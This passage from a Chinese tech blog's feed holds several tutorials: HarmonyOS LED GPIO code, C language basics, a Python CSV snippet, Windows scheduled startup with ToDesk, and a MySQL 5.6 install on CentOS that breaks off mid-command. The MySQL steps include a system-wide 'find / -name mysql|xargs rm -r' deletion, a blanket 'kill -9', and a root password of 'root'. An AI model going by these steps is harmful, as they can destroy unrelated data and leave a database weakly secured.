        <content type="html"><![CDATA[<h1 id="led外设控制"><a class="markdownIt-Anchor" href="#led外设控制">#</a> LED 外设控制</h1><p>更新时间: 2021-07-21 09:12</p><h2 id="概述"><a class="markdownIt-Anchor" href="#概述">#</a> 概述</h2><p>HarmonyOS WLAN 模组基于 Hi3861 平台提供了丰富的外设操作能力，包含 I2C、I2S、ADC、UART、SPI、SDIO、GPIO、PWM、FLASH 等。本文介绍如何通过调用 HarmonyOS 的 NDK 接口，实现对 GPIO 控制，达到 LED 闪烁的效果。其他的 IOT 外设控制，开发者可根据 API 指导文档完成，此处不逐一介绍。</p><h2 id="开发"><a class="markdownIt-Anchor" href="#开发">#</a> 开发</h2><ol><li><p>请先完成<a href="https://device.harmonyos.com/cn/docs/start/introduce/quickstart-lite-introduction-hi3861-0000001105041324#section19352114194115">《Hi3861 快速入门》</a>。</p><p>LED 控制参考示例存放于 applications/sample/wifi-iot/app/iothardware/led_example.c 文件中。</p></li><li><p>实现 IOT 外设控制，首先需要通过查阅原理图明确接线关系。经过查阅，hispark pegasus 的 LED 与芯片的 9 号管脚相连。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define LED_TEST_GPIO 9</span><br></pre></td></tr></table></figure><p>说明</p><p>开发板原理图，请开发者联系 Hi3861 购买渠道客服获取。</p></li><li><p>使用 GPIO 前，需要完成 GPIO 管脚初始化，明确管脚用途，并创建任务，使 LED 周期性亮灭，达到闪烁的效果。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">LedExampleEntry</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    osThreadAttr_t attr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 管脚初始化 */</span></span><br><span class="line">    IoTGpioInit(LED_TEST_GPIO);</span><br><span class="line">    <span class="comment">/* 配置9号管脚为输出方向 */</span></span><br><span class="line">    IoTGpioSetDir(LED_TEST_GPIO, IOT_GPIO_DIR_OUT);</span><br><span class="line"></span><br><span class="line">    attr.name = <span class="string">&quot;LedTask&quot;</span>;</span><br><span class="line">    attr.attr_bits = <span class="number">0U</span>;</span><br><span class="line">    attr.cb_mem = <span class="literal">NULL</span>;</span><br><span class="line">    attr.cb_size = <span class="number">0U</span>;</span><br><span class="line">    attr.stack_mem = <span class="literal">NULL</span>;</span><br><span class="line">    attr.stack_size = LED_TASK_STACK_SIZE;</span><br><span class="line">    attr.priority = LED_TASK_PRIO;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 启动任务 */</span></span><br><span class="line">    <span class="keyword">if</span> (osThreadNew((osThreadFunc_t)LedTask, <span class="literal">NULL</span>, &amp;attr) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[LedExample] Failed to create LedTask!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在循环任务中通过周期性亮灭形式实现 LED 闪烁。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">LedTask</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    (<span class="keyword">void</span>)arg;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">switch</span> (g_ledState) &#123;</span><br><span class="line">            <span class="keyword">case</span> LED_ON:</span><br><span class="line">                IoTGpioSetOutputVal(LED_TEST_GPIO, <span class="number">1</span>);</span><br><span class="line">                usleep(LED_INTERVAL_TIME_US);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> LED_OFF:</span><br><span class="line">                IoTGpioSetOutputVal(LED_TEST_GPIO, <span class="number">0</span>);</span><br><span class="line">                usleep(LED_INTERVAL_TIME_US);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> LED_SPARK:</span><br><span class="line">                IoTGpioSetOutputVal(LED_TEST_GPIO, <span class="number">0</span>);</span><br><span class="line">                usleep(LED_INTERVAL_TIME_US);</span><br><span class="line">                IoTGpioSetOutputVal(LED_TEST_GPIO, <span class="number">1</span>);</span><br><span class="line">                usleep(LED_INTERVAL_TIME_US);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                usleep(LED_INTERVAL_TIME_US);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在代码最下方，使用 HarmonyOS 启动恢复模块接口 SYS_RUN () 启动业务。（SYS_RUN 定义在 ohos_init.h 文件中）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYS_RUN(LedExampleEntry);</span><br></pre></td></tr></table></figure></li><li><p>修改 applications/sample/wifi-iot/app/BUILD.gn 文件，使 led_example.c 参与编译。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>(<span class="string">&quot;//build/lite/config/component/lite_component.gni&quot;</span>)</span><br><span class="line">lite_component(<span class="string">&quot;app&quot;</span>) &#123;</span><br><span class="line">    features = [</span><br><span class="line">        <span class="string">&quot;iothardware:led_example&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="验证"><a class="markdownIt-Anchor" href="#验证">#</a> 验证</h2><p>编译过程请参考《<a href="https://device.harmonyos.com/cn/docs/start/introduce/quickstart-lite-steps-board3861-connection-0000001152048651#section191121332125319">Hi3861 快速入门 - 源码编译</a>》，烧录过程请参考《<a href="https://device.harmonyos.com/cn/docs/start/introduce/quickstart-lite-steps-board3861-connection-0000001152048651#section19458165166">Hi3861 快速入门 - 镜像烧录</a>》。</p><p>完成以上两步后，按下 RST 键复位模组，可发现 LED 在周期性闪烁，与预期相符，验证完毕。</p><p><strong>图 1</strong> LED 闪烁图<br><img "" class="lazyload placeholder" data-original="https://alliance-communityfile-drcn.dbankcdn.com/FileServer/getFile/cmtyPub/011/111/111/0000000000011111111.20210720210842.85858839787437486037865254162699:50520720011258:2800:213E67DE9E53810002D1E1621B9BAA11FA675F287FAF2DB732B3679380E38C92.gif?needInitFileName=true?needInitFileName=true" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 鸿蒙设备开发(hi3861) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 鸿蒙 </tag>
            
            <tag> 单片机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言学习(一)</title>
      <link href="/2021/07/22/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/C/"/>
      <url>/2021/07/22/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/C/</url>
      
        <content type="html"><![CDATA[<h1 id="c语言学习一"><a class="markdownIt-Anchor" href="#c语言学习一">#</a> C 语言学习 (一)</h1><h3 id="起源"><a class="markdownIt-Anchor" href="#起源">#</a> 起源</h3><p>1972 年， 贝尔实验室的丹尼斯・里奇（Dennis Ritch） 和肯・汤普逊（Ken<br>Thompson） 在开发 UNIX 操作系统时设计了 C 语言。 然而， C 语言不完全是里<br>奇突发奇想而来， 他是在 B 语言（汤普逊发明） 的基础上进行设计。 至于 B<br> 语言的起源， 那是另一个故事。 C 语言设计的初衷是将其作为程序员使用的<br>一种编程工具， 因此， 其主要目标是成为有用的语言。</p><h2 id="基础规则"><a class="markdownIt-Anchor" href="#基础规则">#</a> 基础规则</h2><h3 id="示例"><a class="markdownIt-Anchor" href="#示例">#</a> 示例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> <span class="comment">/* 一个简单的C程序 */</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">int</span></span><br><span class="line">num; <span class="comment">/* 定义一个名为num的变量 */</span></span><br><span class="line">num = <span class="number">1</span>; <span class="comment">/* 为num赋一个值 */</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;I am a simple &quot;</span>); <span class="comment">/* 使用printf()函数 */</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;computer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;My favorite number is %d because it is first.\n&quot;</span>,num);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="变量命名"><a class="markdownIt-Anchor" href="#变量命名">#</a> 变量命名</h3><p>可以用小写字母、 大写字母、 数字和下划线（_） 来命名。 而且， 名称<br>的第 1 个字符必须是字符或下划线， 不能是数字。</p><table><thead><tr><th>有效</th><th>无效</th></tr></thead><tbody><tr><td>wiggles</td><td>$Z]**</td></tr><tr><td>cat2</td><td>2cat</td></tr><tr><td>Hot_Tub</td><td>Hot-Tub</td></tr><tr><td>taxRate</td><td>tax rate</td></tr><tr><td>_kcab</td><td>don’t</td></tr></tbody></table><h3 id="保留字"><a class="markdownIt-Anchor" href="#保留字">#</a> 保留字</h3><p><img "" class="lazyload placeholder" data-original="/assets/C%E5%85%B3%E9%94%AE%E5%AD%97.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="关键字"></p><h3 id="基本数据类型"><a class="markdownIt-Anchor" href="#基本数据类型">#</a> 基本数据类型</h3><ol><li><h4 id="整数类型int"><a class="markdownIt-Anchor" href="#整数类型int">#</a> 整数类型 int</h4><p>C 语言提供 3 个附属关键字修饰基本整数类型： short、 long 和 unsigned。<br>应记住以下几点。<br>short int 类型（或者简写为 short） 占用的存储空间可能比 int 类型少， 常<br>用于较小数值的场合以节省空间。 与 int 类似， short 是有符号类型。<br>long int 或 long 占用的存储空间可能比 int 多， 适用于较大数值的场合。 与<br> int 类似， long 是有符号类型。<br>long long int 或 long long（C99 标准加入） 占用的储存空间可能比 long 多，<br>适用于更大数值的场合。 该类型至少占 64 位。 与 int 类似， long long 是有符号类型。<br>unsigned int 或 unsigned 只用于非负值的场合。 这种类型与有符号类型表<br>示的范围不同。 例如， 16 位 unsigned int 允许的取值范围是 0～65535， 而不是 - 32768～32767。 用于表示正负号的位现在用于表示另一个二进制位， 所以无符号整型可以表示更大的数</p></li><li><h4 id="字符型char"><a class="markdownIt-Anchor" href="#字符型char">#</a> 字符型 char</h4><p>char 类型用于储存字符（如， 字母或标点符号） ， 但是从技术层面看，<br>char 是整数类型。 因为 char 类型实际上储存的是整数而不是字符。 计算机使<br>用数字编码来处理字符， 即用特定的整数表示特定的字符。 美国最常用的编<br>码是 ASCII 编码， 本书也使用此编码。 例如， 在 ASCII 码中， 整数 65 代表大写字母 A。 因此， 储存字母 A 实际上储存的是整数 65（许多 IBM 的大型主机使<br>用另一种编码 ——EBCDIC， 其原理相同。 另外， 其他国家的计算机系统可<br>能使用完全不同的编码） 。<br>标准 ASCII 码的范围是 0～127， 只需 7 位二进制数即可表示。 通常， char<br> 类型被定义为 8 位的存储单元， 因此容纳标准 ASCII 码绰绰有余。 许多其他系<br>统（如 IMB PC 和苹果 Macs） 还提供扩展 ASCII 码， 也在 8 位的表示范围之<br>内。 一般而言， C 语言会保证 char 类型足够大， 以储存系统（实现 C 语言的系统） 的基本字符集。<br>许多字符集都超过了 127， 甚至多于 255。 例如， 日本汉字（kanji） 字符<br>集。 商用的统一码（Unicode） 创建了一个能表示世界范围内多种字符集的<br>系统， 目前包含的字符已超过 110000 个。 国际标准化组织（ISO） 和国际电<br>工技术委员会（IEC） 为字符集开发了 ISO/IEC 10646 标准。 统一码标准也与<br> ISO/IEC 10646 标准兼容。<br>C 语言把 1 字节定义为 char 类型占用的位（bit） 数， 因此无论是 16 位还是<br> 32 位系统， 都可以使用 char 类型。</p><p>转义支付</p><p><img "" class="lazyload placeholder" data-original="/assets/C%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210723114546983"></p></li><li><h4 id="布尔类型"><a class="markdownIt-Anchor" href="#布尔类型">#</a> 布尔类型</h4><p>C99 标准添加了_Bool 类型， 用于表示布尔值， 即逻辑值 true 和 false。 因<br>为 C 语言用值 1 表示 true， 值 0 表示 false， 所以_Bool 类型实际上也是一种整数<br>类型。 但原则上它仅占用 1 位存储空间， 因为对 0 和 1 而言， 1 位的存储空间足<br>够了。</p></li><li><h4 id="浮点数float-double和long-double"><a class="markdownIt-Anchor" href="#浮点数float-double和long-double">#</a> 浮点数（float、 double 和 long double  ）</h4><p>​1. 声明浮点型变量<br>浮点型变量的声明和初始化方式与整型变量相同， 下面是一些例子：<br>float noah, jonah;<br>double trouble;<br>float planck = 6.63e-34;<br>long double gnp;<br>​2. 浮点型常量<br>在代码中， 可以用多种形式书写浮点型常量。 浮点型常量的基本形式是： 有符号的数字（包括小数点） ， 后面紧跟 e 或 E， 最后是一个有符号数表示 10 的指数。 下面是两个有效的浮点型常量：<br>-1.56E+12<br>2.87e-3<br> 正号可以省略。 可以没有小数点（如， 2E5） 或指数部分（如，19.28） ， 但是不能同时省略两者。 可以省略小数部分（如， 3.E16） 或整数部分（如， .45E-6） ， 但是不能同时省略两者。 下面是更多的有效浮点型常量示例：<br>3.14159<br>.2<br>4e16<br>.8E-5<br>100.<br>145<br> 不要在浮点型常量中间加空格： 1.56 E+12（错误！ ）默认情况下， 编译器假定浮点型常量是 double 类型的精度。 例如， 假设 some 是 float 类型的变量， 编写下面的语句：<br>some = 4.0 * 2.0;<br> 通常， 4.0 和 2.0 被储存为 64 位的 double 类型， 使用双精度进行乘法运算， 然后将乘积截断成 float 类型的宽度。 这样做虽然计算精度更高， 但是会减慢程序的运行速度。<br>在浮点数后面加上 f 或 F 后缀可覆盖默认设置， 编译器会将浮点型常量看作 float 类型， 如 2.3f 和 9.11E9F。 使用 l 或 L 后缀使得数字成为 long double 类型， 如 54.3l 和 4.32L。 注意， 建议使用 L 后缀， 因为字母 l 和数字 1 很容易混<br>淆。 没有后缀的浮点型常量是 double 类型 。</p></li><li><h4 id="使用数据类型"><a class="markdownIt-Anchor" href="#使用数据类型">#</a> 使用数据类型</h4><p>编写程序时， 应注意合理选择所需的变量及其类型。 通常， 用 int 或 float<br> 类型表示数字， char 类型表示字符。 在使用变量之前必须先声明， 并选择有<br>意义的变量名。 初始化变量应使用与变量类型匹配的常数类型。 例如 ：</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> apples = <span class="number">3</span>;  <span class="comment">/* 正确 */</span></span><br><span class="line"><span class="keyword">int</span> oranges = <span class="number">3.0</span>; <span class="comment">/* 不好的形式 */</span> </span><br></pre></td></tr></table></figure><p>把一个类型的数值初始化给不同类型的变量时， 编译器会把值转换成与<br>变量匹配的类型， 这将导致部分数据丢失。 例如， 下面的初始化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> cost = <span class="number">12.99</span>; <span class="comment">/* 用double类型的值初始化int类型的变量 */</span></span><br><span class="line"><span class="keyword">float</span> pi = <span class="number">3.1415926536</span>; <span class="comment">/* 用double类型的值初始化float类型的变量 *</span></span><br></pre></td></tr></table></figure><ol start="6"><li><h4 id=""><a class="markdownIt-Anchor" href="#">#</a> </h4></li></ol>]]></content>
      
      
      <categories>
          
          <category> C Primer Plus(第六版) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>建立CSV</title>
      <link href="/2021/07/20/Python%E5%AD%A6%E4%B9%A0/%E5%BB%BA%E7%AB%8BCSV/"/>
      <url>/2021/07/20/Python%E5%AD%A6%E4%B9%A0/%E5%BB%BA%E7%AB%8BCSV/</url>
      
        <content type="html"><![CDATA[<h1 id="建立csv"><a class="markdownIt-Anchor" href="#建立csv">#</a> 建立 CSV</h1><p>环境</p><ul><li>pyCharm</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="comment">#获得一个文件对象</span></span><br><span class="line">csvFile = <span class="built_in">open</span>(<span class="string">&quot;test.csv&quot;</span>, <span class="string">&#x27;w+&#x27;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   <span class="comment">#返回一个编写器对象，负责将用户的数据转换为给定类文件对象上的分隔字符串</span></span><br><span class="line">   writer = csv.writer(csvFile)</span><br><span class="line">   <span class="comment">#调用编写器对象将行参数写入文件对象</span></span><br><span class="line">   writer.writerow((<span class="string">&#x27;number&#x27;</span>, <span class="string">&#x27;number plus 2&#x27;</span>, <span class="string">&#x27;number times 2&#x27;</span>))</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">   <span class="comment">#调用编写器对象将行参数写入文件对象</span></span><br><span class="line">      writer.writerow( (i, i+<span class="number">2</span>, i*<span class="number">2</span>))</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">   <span class="comment">#关闭文件</span></span><br><span class="line">   csvFile.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 定时开机、联网、打开远程服务</title>
      <link href="/2021/06/21/%E5%B9%B3%E5%8F%B0/Windows%20%E5%AE%9A%E6%97%B6%E5%BC%80%E6%9C%BA%E3%80%81%E8%81%94%E7%BD%91%E3%80%81%E6%89%93%E5%BC%80%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/"/>
      <url>/2021/06/21/%E5%B9%B3%E5%8F%B0/Windows%20%E5%AE%9A%E6%97%B6%E5%BC%80%E6%9C%BA%E3%80%81%E8%81%94%E7%BD%91%E3%80%81%E6%89%93%E5%BC%80%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="windows-定时开机-联网-打开远程服务"><a class="markdownIt-Anchor" href="#windows-定时开机-联网-打开远程服务">#</a> Windows 定时开机、联网、打开远程服务</h1><p>作者：SSR</p><h2 id="设置定时任务"><a class="markdownIt-Anchor" href="#设置定时任务">#</a> 设置定时任务</h2><ol><li>右键此电脑 &gt; 管理 &gt; 任务计划程序 &gt; 任务计划库</li><li>在右侧创建任务<img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210621172358836.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210621172358836"></li><li>输入事件名称，选择不管是否登陆都要执行（关键！确保开机不登录也运行）<img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210621172519107.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210621172519107"></li><li>添加触发器 1，选择启动时<img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210621172654148.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210621172654148"></li><li>添加触发器 2，选择每日特定时间<img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210621172812758.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210621172812758"></li><li>添加操作并指定联网脚本（理论上 java、python 都随意，这里使用批处理脚本）<img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210621172957100.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210621172957100"></li><li>添加操作，指定打开远程连接软件 ToDesk (<a href="http://www.todesk.com">www.todesk.com</a>)<img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210621173149721.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210621173149721"></li><li>点击确定完成设置</li></ol><h2 id="设置bios启动"><a class="markdownIt-Anchor" href="#设置bios启动">#</a> 设置 BIOS 启动</h2><ol><li>打开开始 &gt; 设置 &gt; 更新和安全 &gt; 恢复 &gt; 立即重新启动 &gt; 疑难解答 &gt; 高级选项 &gt; UEFI 固件设置 &gt; 重启</li><li>找到电池选项，修改如下，保存开机<img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5CIMG_20210621_164601.jpg" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="IMG_20210621_164601"></li></ol><h2 id="验证"><a class="markdownIt-Anchor" href="#验证">#</a> 验证</h2><p>一气呵成，简直完美</p>]]></content>
      
      
      
        <tags>
            
            <tag> 平台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安装mysql_5.6.33 linux_64位</title>
      <link href="/2021/06/21/%E5%B9%B3%E5%8F%B0/%E5%AE%89%E8%A3%85mysql_5.6.33%20linux_64%E4%BD%8D/"/>
      <url>/2021/06/21/%E5%B9%B3%E5%8F%B0/%E5%AE%89%E8%A3%85mysql_5.6.33%20linux_64%E4%BD%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="安装mysql_5633-linux_64位"><a class="markdownIt-Anchor" href="#安装mysql_5633-linux_64位">#</a> 安装 mysql_5.6.33 linux_64 位</h1><h2 id="环境及软件"><a class="markdownIt-Anchor" href="#环境及软件">#</a> 环境及软件</h2><pre><code>* Centos7* mysql_5.6.33 linux_64位* wget http://dev.mysql.com/get/Downloads/MySQL-5.6/mysql-5.6.33-linux-glibc2.5-x86_64.tar.gz</code></pre><h2 id="安装流程"><a class="markdownIt-Anchor" href="#安装流程">#</a> 安装流程</h2><h3 id="1-卸载老版本"><a class="markdownIt-Anchor" href="#1-卸载老版本">#</a> 1. 卸载老版本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -name mysql</span><br><span class="line">rm -rf 上边查找到的路径，多个路径用空格隔开</span><br><span class="line"><span class="meta">#</span><span class="bash">或者下边一条命令即可</span></span><br><span class="line">find / -name mysql|xargs rm -r</span><br></pre></td></tr></table></figure><h3 id="2-解压安装包到usrlocal"><a class="markdownIt-Anchor" href="#2-解压安装包到usrlocal">#</a> 2. 解压安装包到 /usr/local</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf mysql-5.6.33-linux-glibc2.5-x86_64.tar.gz -C /usr/local</span><br></pre></td></tr></table></figure><h3 id="3-重命名文件夹"><a class="markdownIt-Anchor" href="#3-重命名文件夹">#</a> 3. 重命名文件夹</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local</span><br><span class="line">mv mysql-5.6.33-linux-glibc2.5-x86_64/ mysql</span><br></pre></td></tr></table></figure><h3 id="4-添加mysql用户组和用户名"><a class="markdownIt-Anchor" href="#4-添加mysql用户组和用户名">#</a> 4. 添加 mysql 用户组和用户名</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">groupadd mysql</span><br><span class="line">useradd -r -g mysql mysql</span><br><span class="line">groups mysql</span><br></pre></td></tr></table></figure><h3 id="5-更改文件夹权限"><a class="markdownIt-Anchor" href="#5-更改文件夹权限">#</a> 5. 更改文件夹权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd mysql/</span><br><span class="line">chown -R mysql:mysql ./</span><br></pre></td></tr></table></figure><h3 id="6-执行安装脚本"><a class="markdownIt-Anchor" href="#6-执行安装脚本">#</a> 6. 执行安装脚本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./scripts/mysql_install_db --user=mysql</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">安装完执行下列语句修改权限</span></span><br><span class="line">chown -R root:root ./</span><br><span class="line">chown -R mysql:mysql data</span><br></pre></td></tr></table></figure><h3 id="7-更改数据库密码"><a class="markdownIt-Anchor" href="#7-更改数据库密码">#</a> 7. 更改数据库密码</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">首先启动mysql</span></span><br><span class="line">./support-files/mysql.server start</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">如果已经启动</span></span><br><span class="line">ps aux|grep mysql</span><br><span class="line">kill -9 #上边的进程号</span><br><span class="line"><span class="meta">#</span><span class="bash">或者下边一条命令即可杀掉所有MySQL进程</span></span><br><span class="line">ps aux|grep mysql|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">修改密码为root</span></span><br><span class="line">./bin/mysqladmin -u root -h localhost.localdomain password &#x27;root&#x27;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">登录mysql</span></span><br><span class="line">./bin/mysql -h 127.0.0.1 -u root -p root</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">修改其他用户密码</span></span><br><span class="line">update mysql.user set 